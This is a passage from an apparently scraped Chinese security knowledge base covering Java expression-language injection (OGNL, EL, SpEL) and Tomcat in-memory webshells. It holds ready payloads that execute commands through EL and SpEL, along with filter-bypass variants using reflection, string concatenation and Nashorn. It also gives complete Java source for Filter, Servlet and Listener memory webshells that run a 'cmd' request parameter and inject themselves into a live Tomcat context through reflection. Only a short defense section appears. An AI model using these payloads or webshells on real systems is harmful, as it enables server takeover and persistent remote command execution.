java.lang.String[]{\"calc\"})).start() //获取当前绝对路径 @java.lang.System@getProperty(\"user.dir\") // e-mobole带回显 @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) 参考 OGNL表达式注入漏洞总结 Struts2著名RCE漏洞引发的十年之思 Struts2 中的OGNL、表达式注入及防御 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:56:42 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/07.OGNL表达式.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/08.EL表达式.html":{"url":"知识库/02.JAVA安全/08.EL表达式.html","title":"08.EL表达式","keywords":"","body":" 介绍 快速搭建tomcat环境 前期准备 环境搭建 EL表达式使用 EL基础语法 [ ]与.运算符 获取变量举例 操作符 隐含对象 函数 禁用/启用EL表达式 EL表达式注入 EL表达式注入绕过 参考 介绍 EL 全名为Expression Language，是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。 EL主要作用： 获取数据 EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的web域 中检索java对象、获取数据。(某个web域 中的对象，访问javabean的属性、访问list集合、访问map集合、访问数组) 执行运算 利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算。${user==null} 获取web开发常用对象 EL 表达式定义了一些隐式对象，利用这些隐式对象，web开发人员可以很轻松获得对web常用对象的引用，从而获得这些对象中的数据。 调用Java方法 EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法。 快速搭建tomcat环境 因为需要使用到JSP来学习EL表达式，所以想法是快速搭一个tomcat环境，之前采用的是添加tomcat依赖到pom.xml的方法，使用内置tomcat，但是感觉搭建环境速度太慢了，所以学了个新的方法来快速搭建tomcat环境 参考：https://blog.51cto.com/u_15119353/3309943 前期准备 tomcat可用版 IDEA tomcat各版本下载地址：https://archive.apache.org/dist/tomcat/tomcat-8/ 环境搭建 先建一个平平无奇的Java项目 然后右键，选择Add Framework Support... 勾选Web Application 这个时候就会多一个web目录，也就是我们的webapps目录 打开Project Structure窗口，新建2个文件夹在WEB-INF目录下，分别是classes和lib，这一步是为了添加项目类路径 修改编译后的类路径到我们刚才新建的classes目录下 添加本地tomcat服务器 配置好需要的信息，然后Fix修复一下 给应用上下文路径设置为跟路径，如果这里设置为/a 则访问就变成 localhost:8080/a/ 然后启动运行即可 项目结构 EL表达式使用 EL基础语法 在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。 例如，${userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${pageScope.userinfo}表示访问page范围中的userinfo变量。 简单地说，使用EL表达式语法：${EL表达式} 其中，EL表达式和JSP代码等价转换。事实上，可以将EL表达式理解为一种简化的JSP代码。 扩展JSP代码的写法总结： JSP表达式： 向浏览器输出变量或表达式的计算结果。 JSP脚本： 执行java代码的原理：翻译到_jspService()方法中。 JSP声明： 声明jsp的成员变量或成员方法。 JSP注释： 用于注释JSP代码，不会翻译到Java文件中，也不会执行。 [ ]与.运算符 EL表达式提供.和[]两种运算符来存取数据。 当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[\"My-Name\"]}。 如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。 获取变量举例 map = new HashMap<>(); map.put(\"my-name\", \"admin\"); request.setAttribute(\"test\", map); %> 从四个作用域中搜索变量：${name} 从requestScope作用域中获取变量：${requestScope.request} 从sessionScope作用域中获取变量：${sessionScope.session} 从pageScope作用域中获取变量：${pageScope.page} 从applicationScope作用域中获取变量：${applicationScope.application} 从作用域中获取特殊符号变量：${requestScope.test[\"my-name\"]} 操作符 类型 符号 算术型 +、-（二元）、*、/、div、%、mod、-（一元） 逻辑型 and、&&、or、\\ \\ 、!、not 关系型 ==、eq、!=、ne、、gt、=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 空 empty 空操作符是前缀操作，可用于确定值是否为空。 条件型 A ?B :C 。根据 A 赋值的结果来赋值 B 或 C。 运算符优先级如下（从高到低，从左到右）： [] . () (用于更改运算符的优先) - (一元) not ! empty * / div % mod + - (二元) += <> = lt gt le ge == != eq ne && and || or ? : -> = ; 隐含对象 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描 述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 函数 EL表达式语法允许开发人员开发自定义函数，以调用Java类的方法。语法：${prefix：method(params)} 在EL表达式中调用的只能是Java类的静态方法，这个Java类的静态方法需要在TLD文件中描述，才可以被EL表达式调用。 EL自定义函数用于扩展EL表达式的功能，可以让EL表达式完成普通Java程序代码所能完成的功能。 举例： ==>编写一个让所有字符大写的函数 一般来说， EL自定义函数开发与应用包括以下三个步骤： 1、编写一个Java类的静态方法 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 3、在JSP页面中导入和使用自定义函数 1、编写一个Java类的静态方法，代码如下 public class ELFunc { public static String up(String message) { if (message == null){ return null; } return message.toUpperCase(); } } 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 ELFunc.tld位置 代码 1.0 ELFunc --> /ELFunc 子元素用于指定EL自定义函数的名称--> up 子元素用于指定完整的Java类名--> ELFunc 子元素用于指定Java类中的静态方法的签名， 20 方法签名必须指明方法的返回值类型及各个参数的类型，各个参数之间用逗号分隔。--> java.lang.String up(java.lang.String) 3、在JSP页面中导入和使用自定义函数 ${fn:up(\"123aaabbbCCC\")} 实验了好久代码应该是没问题的，但是还是有报错，后面需要再解决这个问题吧，今天是解决不了了，不然一天没了。。。 禁用/启用EL表达式 全局禁用EL表达式，web.xml中进入如下配置： *.jsp true 单个文件禁用EL表达式 在JSP文件中可以有如下定义： 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。 JSP2.0中默认的启用EL表达式。 EL表达式注入 原理都是一样的：表达式全部或部份外部可控。列一些通用的poc //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象） ${pageContext} //获取Web路径 ${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")} //文件头参数 ${header} //获取webRoot ${applicationScope} //执行命令 ${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())} EL表达式注入绕过 通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤 ${\"xxx\".toString().charAt(0).toChars(97)[0].toString()} ${\"xxx\".toString().charAt(0).toChars(97)[0].toString().concat(\"xxx\".toString().charAt(0).toChars(98)[0].toString())} 通过以上代码，只需要修改toChars()中的ascii码值就可以变成任意字符 参考 javaweb学习总结(二十九)——EL表达式 浅析EL表达式注入漏洞 （很详细） Java EL （Expression Language）表达式注入 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:00:31 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/08.EL表达式.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/09.SpEL表达式.html":{"url":"知识库/02.JAVA安全/09.SpEL表达式.html","title":"09.SpEL表达式","keywords":"","body":" 介绍 基础使用 pom.xml 基础例子 SpEL语法 SpEL表达式分类 基本表达式 类相关表达式 集合相关表达式 其他表达式 SpEL类相关表达式‼️ 类类型表达式 类实例化 instanceof 表达式 常用payload 绕过方式 防御 参考 介绍 Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 SpEL的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。 基础使用 先新建一个Spring项目 pom.xml org.springframework spring-expression 5.2.12.RELEASE 基础例子 一个简单的Controller message为get传入的参数 ExpressionParser接口负责解析表达式字符串 getValue方法执行表达式并返回结果 默认容器是spring本身的容器：ApplicationContext package com.spel.test.demo; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @GetMapping(\"/test\") public String catUser(String message) { ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); return expression.getValue().toString(); } } 访问 http://127.0.0.1:8080/test?message=T(java.lang.Math).random()*100，可见成功得到一个随机数，说明表达式被执行了 访问 http://127.0.0.1:8080/test?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() 可以直接执行系统命令 SpEL语法 SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如： 引用其他对象:#{car} 引用其他对象的属性：#{car.brand} 调用其它方法 , 还可以链式操作：#{car.toString()} 其中属性名称引用还可以用$符号 如：${someProperty} 除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符： #{T(java.lang.Math)} 演示因为是本地环境，且是将输入的参数直接当成SpEL表达式去执行的，所以没有输入#{}，但是如果用@Value去获取值执行就需要了 @Value(\"#{ T(java.lang.Math).random() * 100.0 }\") private int rand; SpEL表达式分类 基本表达式 字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式； 类相关表达式 类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用； 集合相关表达式 内联 List、内联数组、集合、字典访问、列表、字典； 其他表达式 模版表达式 SpEL类相关表达式‼️ 类类型表达式 使用\"T(Type)\"来表示 java.lang.Class 实例，\"Type\"必须是类全限定名，\"java.lang\"包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 举例 // java.lang 包类访问 T(String) // 其他包类访问 T(java.lang.Runtime).getRuntime().exec('open -na Calculator') //类静态字段访问 T(Integer).MAX_VALUE //类静态方法调用 T(Integer).parseInt('1') 类实例化 类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。 new java.util.Date() instanceof 表达式 SpEL 支持 instanceof 运算符，跟 Java 内使用同义 \"test\" instanceof T(String) 常用payload ${12*12} T(java.lang.Runtime).getRuntime().exec(\"open -na Calculator\") T(Thread).sleep(10000) #this.getClass().forName('java.lang.Runtime').getRuntime().exec('open -na Calculator') new java.lang.ProcessBuilder('open -na Calculator').start() 回显 引入了org.apache.commons.io这个包的话，可以输出回显 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()) 绕过方式 如果采用关键词过滤，可以采用反射的方式来绕过 T(String).class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open%20-na%20Calculator\") // + 一定要用url编码，不然浏览器解析会有问题 T(String).class.forName(\"java.lang.Ru\"%2b\"ntime\").getMethod(\"getRu\"%2b\"ntime\").invoke(null).exec(\"open%20-na%20Calculator\") T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).getClass().getMethod(\"exec\",T(String)).invoke(T(java.lang.Runtime).getRuntime(),\"open%20-na%20Calculator\") 使用ScriptEngineManager构造 T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('open -na Calculator')\") T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runt\"%2b\"ime.getRu\"%2b\"ntime().e\"%2b\"xec('open -na Calculator')\") 如果不能使用双引号，那么可以采用生成任意字符+concat函数的形式进行绕过 T(java.lang.Character).toString(97).concat(T(java.lang.Character).toString(98)) 防御 因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了SimpleEvaluationContext作为安全类来防御该类漏洞。 官方文档：https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换 StandardEvaluationContext。 基础举例 ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build(); return expression.getValue(context).toString(); 参考 Java代码审计之SpEL表达式注入 由浅入深SpEL表达式注入漏洞 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:00:50 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/09.SpEL表达式.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/10.Tomcat内存马基础入门.html":{"url":"知识库/02.JAVA安全/10.Tomcat内存马基础入门.html","title":"10.Tomcat内存马基础入门","keywords":"","body":" Servlet web介绍 创建第一个Servlet web application step 1：使用idea 创建一个 web Application step 2：添加相关的依赖包（$tomcat/lib/servlet-api.jar） step 3：新建Servlet step 4：配置Tomcat step 5：启动项目 Filter 动态注入内存 ServletContext ApplicationContext Filter相关变量 动态注入 JSP Servlet 动态注入内存 Servlet 生命周期 init() 方法 service() 方法 doGet() 方法 doPost() 方法 destroy() 方法 service方法 动态注入 JSP Listener 动态注入内存 ServletRequestListener 接口 动态注入 JSP 总结 https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ Servlet web介绍 Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。 使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。 Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于 CGI，Servlet 有以下几点优势 性能明显更好。 Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。 Servlet 是独立于平台的，因为它们是用 Java 编写的。 服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。 Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。 创建第一个Servlet web application step 1：使用idea 创建一个 web Application step 2：添加相关的依赖包（$tomcat/lib/servlet-api.jar） 右键项目 Open Moudle Setting 或者如下箭头的快捷键，添加依赖($tomcat/lib/.jar) step 3：新建Servlet step 4：配置Tomcat 这里有告警，说没有artifacts，首先确定是否Project Structure 下 Module里是否包含我们的项目 以及artifacts里是否有 确定都有再点fix step 5：启动项目 在创建的Servlet(Helloworld.class)中填写如下代码 import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"HelloWorld\") public class HelloWorld extends HttpServlet { private String message; public void init() throws ServletException{ message = \"This is my first Servlet Application\"; } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置:响应内容类型 response.setContentType(\"text/html\"); // 输出文本 PrintWriter out = response.getWriter(); out.write(\" \" + message + \" \"); } } 然后配置web.xml HelloWorld HelloWorld HelloWorld /hello 然后回到HelloWorld.class，启动web Filter 动态注入内存 Filter是java web中的过滤器，会对客户端发送的请求进行过滤并做一些操作，我们可以在filter中写入命令执行的恶意文件，让客户端请求它来完成命令执行； Filter 内存马是通过动态注册以一个恶意Filter，由于是动态注册的，所以这个filter没有文件实体，存在内存中，当tomcat重启就消失了（恕我直言，解决内存马最好的办法就是重启） 一般我们把这个Filter放在所有的filter最前面优先执行，这样我们的请求就不会受到其他filter的干扰 需要动态注册filter就需要添加filter相关的函数 ServletContext javax.servlet.servletContext中存在addFilter，addServlet，addListener方法，即添加Filter，Servlet，Listener this.getServletContext();，this.getServletConfig().getServletContext(); 是获取ServletContext的方法 ApplicationContext 在Tomcat中，org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现，所以需要引入org.apache.catalina.core.ApplicationContext这个库，用它获取Context Filter相关变量 filterMaps 变量：包含所有过滤器的URL映射关系 filterDefs 变量：包含所有过滤器包括实例内部等变量 filterConfigs 变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理 org.apache.catalina.core.ApplicationFilterConfig 在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef import org.apache.catalina.deploy.FilterMap; import org.apache.catalina.deploy.FilterDef; // tomcat 8/9 import org.apache.tomcat.util.descriptor.web.FilterDef; import org.apache.tomcat.util.descriptor.web.FilterMap; 创建一个Filter，查看结构 package Filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import java.io.IOException; @WebFilter(filterName = \"FilterDemo\") public class FilterDemo implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { System.out.println(\"exec filter\"); chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { System.out.println(\"init filter\"); } } FilterDemo中有init，doFilter，destory三个重要方法 init()方法：初始化参数，在创建Filter时自动调用，当我们需要设置初始化参数的时候，可以写到该方法中。 doFilter()方法：拦截到要执行的请求时，doFilter就会执行。这里面写我们对请求和响应的预处理 destory()方法：在销毁Filter时自动调用 对我们来说，init和destory不需要做什么，只需要写一个doFilter方法拦截需要的请求，将其参数用于Runtime.getRuntime().exec()做命令执行，并将返回的数据打印到Response中即可，如下例： public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd!= null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } filterChain.doFilter(servletRequest, servletResponse); } 动态注入 我们将filter部分写好，下一步就是实现将其注入到内存中 protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { PrintWriter out = response.getWriter(); ServletContext servletContext = request.getSession().getServletContext(); try{ Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); String name = \"filterDemo\"; //判断是否存在filterDemo这个filter，如果没有则准备创建 if (filterConfigs.get(name) == null){ //定义一些基础属性、类名、filter名等 FilterDemo filter = new FilterDemo(); FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); //添加filterDef standardContext.addFilterDef(filterDef); //创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/* FilterMap filterMap = new FilterMap(); // filterMap.addURLPattern(\"/*\"); filterMap.addURLPattern(\"/xyz\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); //添加我们的filterMap到所有filter最前面 standardContext.addFilterMapBefore(filterMap); //反射创建FilterConfig，传入standardContext与filterDef Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); //将filter名和配置好的filterConifg传入 filterConfigs.put(name,filterConfig); out.write(\"Inject success!\"); } else{ out.write(\"Injected!\"); } }catch(Exception e){ e.printStackTrace(); } } JSP Servlet 动态注入内存 要了解Servlet动态注入内存，那么就需要对Servlet的生命周期要有一定的了解 Servlet 生命周期 Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程： Servlet 初始化后调用 init () 方法。 Servlet 调用 service() 方法来处理客户端的请求。 Servlet 销毁前调用 destroy() 方法。 最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。 init() 方法 init 方法被设计成只调用一次。它在第一次创建 Servlet 时被调用，在后续每次用户请求时不再调用。因此，它是用于一次性初始化，就像 Applet 的 init 方法一样。 Servlet 创建于用户第一次调用对应于该 Servlet 的 URL 时，但是您也可以指定 Servlet 在服务器第一次启动时被加载。 当用户调用一个 Servlet 时，就会创建一个 Servlet 实例，每一个用户请求都会产生一个新的线程，适当的时候移交给 doGet 或 doPost 方法。init() 方法简单地创建或加载一些数据，这些数据将被用于 Servlet 的整个生命周期 service() 方法 service() 方法是执行实际任务的主要方法。Servlet 容器（即 Web 服务器）调用 service() 方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。 每次服务器接收到一个 Servlet 请求时，服务器会产生一个新的线程并调用服务。service() 方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法 service() 方法由容器调用，service 方法在适当的时候调用 doGet、doPost、doPut、doDelete 等方法。所以，您不用对 service() 方法做任何动作，您只需要根据来自客户端的请求类型来重写 doGet() 或 doPost() 即可。 doGet() 和 doPost() 方法是每次服务请求中最常用的方法 doGet() 方法 GET 请求来自于一个 URL 的正常请求，或者来自于一个未指定 METHOD 的 HTML 表单，它由 doGet() 方法处理 doPost() 方法 POST 请求来自于一个特别指定了 METHOD 为 POST 的 HTML 表单，它由 doPost() 方法处理 destroy() 方法 destroy() 方法只会被调用一次，在 Servlet 生命周期结束时被调用。destroy() 方法可以让您的 Servlet 关闭数据库连接、停止后台线程、把 Cookie 列表或点击计数器写入到磁盘，并执行其他类似的清理活动。 在调用 destroy() 方法之后，servlet 对象被标记为垃圾回收 service方法 在service方法中，Servlet容器在此生命周期中会处理每次来的请求，就像是“拦截器”一般 // ServletTest import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"ServletTest\") public class ServletTest extends HttpServlet { @Override public void init() throws ServletException { System.out.println(\"init\"); } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { System.out.println(\"Servlet Service Test\"); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置:响应内容类型 response.setContentType(\"text/html\"); // 输出文本 PrintWriter out = response.getWriter(); out.write(\" Test \"); } } Helloworld Helloworld Helloworld /hello ServletTest ServletTest ServletTest /test 可以看到每刷新一次，就会打印service生命周期中的Servlet Service Test，而最重要的是没有进入doGet()，相信大家也明白什么意思了 动态注入 我们在service中写入恶意代码，这里还是以ServletTest.java文件为例，已删除web.xml中ServletTest的路由了 import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(name = \"ServletTest\") public class ServletTest extends HttpServlet { @Override public void init() throws ServletException { System.out.println(\"init\"); } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd != null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } 获取context部分与filter中相同,仍然从org.apache.catalina.core.ApplicationContext反射获取 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 然后需要将上文写的servlet封装成wrapper再使用context添加 ServletTest demo = new ServletTest(); org.apache.catalina.Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"xyz\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(demo); wrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(wrapper); standardContext.addServletMapping(\"/xyz\",\"xyz\"); out.println(\"injected Servlet success!\"); 在Helloworld 这个servlet中，我们将代码写入 import org.apache.catalina.Wrapper; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.ServletContext; import javax.servlet.ServletException; import java.io.IOException; import java.io.PrintWriter; import java.lang.reflect.Field; public class Helloworld extends javax.servlet.http.HttpServlet { private String message; public void init() throws ServletException{ message = \"This is my first servlet application\"; } protected void doPost(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException { } protected void doGet(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException { PrintWriter out = response.getWriter(); try { ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletTest demo = new ServletTest(); Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"xyz\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(demo); wrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(wrapper); // 这里是增加ServletMapping standardContext.addServletMapping(\"/xyz\",\"xyz\"); out.println(\"injected Servlet success!\"); }catch (Exception e){ e.printStackTrace(); } } } 效果如下： JSP 遇到500 不要慌，访问/abc试一试 Listener 动态注入内存 监听器就是监听某个对象的的状态变化的组件，监听器的相关概念： 事件源：被监听的对象 ----- 三个域对象 request session servletContext 监听器：监听事件源对象 事件源对象的状态的变化都会触发监听器 注册监听器：将监听器与事件源进行绑定 响应行为：监听器监听到事件源的状态变化时 所涉及的功能代码ServletRequestListener 接口 该接口实现的方法有requestDestroyed，requestInitialized，分别是在监听request请求结束，以及request请求开始，我们着重看请求开始的部分 ```java import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; public class ListenerDemo implements ServletRequestListener { @Override public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { } } 在`requestInitialized`这个函数中，我们从`servletRequestEvent`参数中取cmd参数，在当前上下文只要在任意路由下监听到了cmd参数存在值，那么就执行命令，具体操作如下 ```java public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } 注意，这里是无回显的 动态注入 在Helloworld这个Servlet中，获取context，并将listener添加进去，具体如下 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = 